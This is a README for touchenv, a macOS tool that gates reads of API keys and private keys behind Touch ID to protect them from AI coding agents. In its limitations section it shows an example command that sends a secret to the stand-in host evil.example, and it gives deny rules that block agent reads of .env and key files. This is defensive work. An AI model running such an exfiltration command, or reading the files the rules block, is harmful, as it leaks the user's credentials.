# touchid-secrets

**`touchenv`: keep your API keys, tokens and private keys in the macOS Keychain, and make every read ask for
your fingerprint.** It is for the age of AI coding agents.

```sh
touchenv set OPENAI_API_KEY                               # paste it once, it is not shown
touchenv run OPENAI_API_KEY -- python agent.py            # Touch ID, then the key is in that command's env only
touchenv run ASC_KEY_PATH:file -- fastlane beta           # a .p8 / .pem / .json key: handed over as a temp file
```

<p align="center"><i>The Touch ID prompt says who is asking, for which secret, for which command:</i><br>
<code>… give Claude Code the secret ASC_KEY_PATH for the command: fastlane beta</code></p>

## Why

Coding agents such as Claude Code, Codex, Cursor and Gemini CLI run shell commands as *you*. Every secret on your
Mac that sits in a file is one `cat` away from them. That includes:

- `.env` files and `~/.zshrc` exports;
- `.p8` and `.pem` keys;
- `gh`, `wrangler`, `npm` and `docker` tokens.

Usually the agent means well. But it can read a secret by mistake:
- while debugging ("let me check your config");
- when a prompt injection hides in a README, an issue or a web page it reads;
- when a compromised npm or PyPI package runs in a `postinstall` that the agent started.

Once read, the secret ends up in a transcript, a log, or somebody else's server.

The usual defences don't close this gap:

| Defence | Why it falls short |
|---|---|
| **Deny rules in the agent's settings** (`Read(**/.env)`) | They help, but they are advisory. They cover the tools the agent knows about, not every way a shell can open a file. |
| **The Keychain alone** | Works, until you click **Always Allow** on the "wants to use your confidential information" dialog once. After that, any process that runs `security find-generic-password -w` gets the secret silently. People are trained to click that dialog. |
| **A password manager CLI** | Usually unlocks once per session. After that, the agent can read every item. |

`touchenv` puts a **physical step** in front of every read: your finger on the sensor, or your Mac password. The
macOS prompt names the requester, the secret and the exact command. An agent can *ask* for a secret, but only you
can say yes, one command at a time. When you don't recognise the request, you just don't touch.

## How it works

- Secrets are generic-password items in the **Data Protection keychain**, created with a
  [`userPresence`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/userpresence)
  access control and `WhenUnlockedThisDeviceOnly`. They never sync to iCloud and never leave the Mac.
- **The OS enforces Touch ID, not touchenv.** Even code running inside touchenv cannot read an item without a fresh
  Touch ID or password.
- **There is no "Always Allow".** Each `touchenv` call asks again. One `run` with several secrets asks once.
- **Other programs can't see the items at all.** That includes `security`, other apps, and scripts. The items live in
  a keychain access group that only the signed `touchenv.app` holds. That is why touchenv ships as a signed app with a
  provisioning profile rather than a bare binary.
- **The prompt names who is asking.** touchenv walks up its parent processes, skipping shells (`zsh`, `bash`, `env`,
  `sudo`…), and names the first real program. That is `Claude Code` when an agent asked, or your terminal when you
  typed it. The command is shown up to 160 characters.
- **`run` hands each secret to one command only:**
  - `NAME`: the secret goes into that environment variable;
  - `NAME:file`: the secret goes into a `0600` file inside a private `0700` temp folder, and the variable holds its
    path. The folder is deleted when the command exits, including after Ctrl-C.
- touchenv makes no network connections. It is one Swift file of about 250 lines, and the code is meant to be read.

## Install

Requires macOS 13 or later, on Apple Silicon or Intel. Touch ID is optional: without it, macOS asks for your login
password instead.

### Prebuilt (no Apple Developer account needed)

Download `touchenv-<version>-macos.zip` from [Releases](https://github.com/ptrinh/touchid-secrets/releases). It is
signed with Developer ID and notarized by Apple. Then:

```sh
mkdir -p ~/Applications ~/.local/bin
unzip touchenv-*-macos.zip -d ~/Applications
ln -sf ~/Applications/touchenv.app/Contents/MacOS/touchenv ~/.local/bin/touchenv   # ~/.local/bin must be on PATH
touchenv --version
```

The prebuilt app is signed by SENPRINTS LLC (team `84T567KMYD`). Your secrets go into the access group
`84T567KMYD.uk.trinh.touchenv` **in your own Mac's keychain**. That is only a name: nothing is shared with anyone. If
you'd rather not run a binary you didn't build, build it yourself.

### Build it yourself

You need a paid Apple Developer account, because a keychain access group is a restricted entitlement and needs a
provisioning profile.

1. Go to [developer.apple.com](https://developer.apple.com/account/resources/identifiers/list), open
   **Identifiers**, and register a macOS App ID, for example `com.example.touchenv`. No capabilities are needed.
2. Go to **Profiles** and create a **Developer ID** profile for that App ID with your Developer ID Application
   certificate. Download it.
3. Run the build:

```sh
git clone https://github.com/ptrinh/touchid-secrets && cd touchid-secrets
cat > build.local <<'EOF'
TOUCHENV_TEAM_ID=ABCDE12345
TOUCHENV_BUNDLE_ID=com.example.touchenv
TOUCHENV_SIGN_ID="Developer ID Application: Your Name (ABCDE12345)"
TOUCHENV_PROFILE="$HOME/Downloads/touchenv.provisionprofile"
EOF
./build.sh        # installs ~/Applications/touchenv.app and links ~/.local/bin/touchenv
```

Secrets stored by one build can only be read by a build signed for the same team and App ID. Rebuilding or upgrading
keeps them. Switching between the prebuilt app and your own build does not: move them over with
`old run A:file B:file -- sh -c 'touchenv set A < "$A"; touchenv set B < "$B"'`.

## Usage

```sh
touchenv set NAME                  # type it (hidden), or pipe it:  touchenv set NAME < key.p8
touchenv ls                        # names only, no Touch ID
touchenv run NAME [NAME2 ...] -- command args       # one Touch ID for all of them
touchenv run NAME:file -- command                   # NAME = path to a temp file holding the secret
touchenv get NAME                  # print it (you rarely want this: prefer run)
touchenv rm NAME                   # delete
```

`NAME` is also the environment variable name, so it must look like one: `[A-Za-z_][A-Za-z0-9_]*`.
`set` on an existing name replaces it, after a Touch ID.

### Moving your secrets in

```sh
touchenv set GITHUB_TOKEN                                  # then remove it from ~/.zshrc
touchenv set ASC_KEY_PATH < ~/Downloads/AuthKey_XXXX.p8    # then delete the .p8 (keep an offline backup)
```

Then replace each `export SECRET=…` in your shell profile with a call through `touchenv run`. For example:

```sh
alias deploy='touchenv run CLOUDFLARE_API_TOKEN -- npx wrangler deploy'
```

### With AI agents

Tell the agent the rule once, for example in `CLAUDE.md` or `AGENTS.md`:

> Secrets are in touchenv. Never read secret files; run commands that need one as
> `touchenv run NAME[:file] -- <command>`, and I'll approve with Touch ID. `touchenv ls` lists the names.

Also block the plain files in the agent's settings. For Claude Code, add to `~/.claude/settings.json`:

```json
{ "permissions": { "deny": ["Read(**/.env)", "Read(**/.env.*)", "Read(**/*.p8)", "Read(**/*.pem)"] } }
```

If the agent runs commands in a sandbox, let `touchenv` run outside it: the sandbox blocks access to the Data
Protection keychain. In Claude Code, set `"sandbox": { "excludedCommands": ["touchenv *"] }`.

## What it does not protect against

Be clear about the limits:

- **Once you approve, the command has the secret.** It can do anything with it, and so can whatever that command
  runs. `touchenv run KEY -- sh -c 'curl evil.example -d "$KEY"'` will show exactly that text in the prompt. **Read
  the prompt before you touch.**
- **Commands in the prompt are cut at 160 characters.** If a command is long or unfamiliar, deny it and ask what it
  does.
- **Malware already running as you** can't read the items, but it can wait for you to approve something and then
  read that process's memory or environment. Root or kernel compromise is out of scope, as with any user-space tool.
- **Secrets already on disk stay exposed.** That covers old copies, shell history and backups. Moving a secret in
  doesn't scrub the places it used to live.

## License

MIT
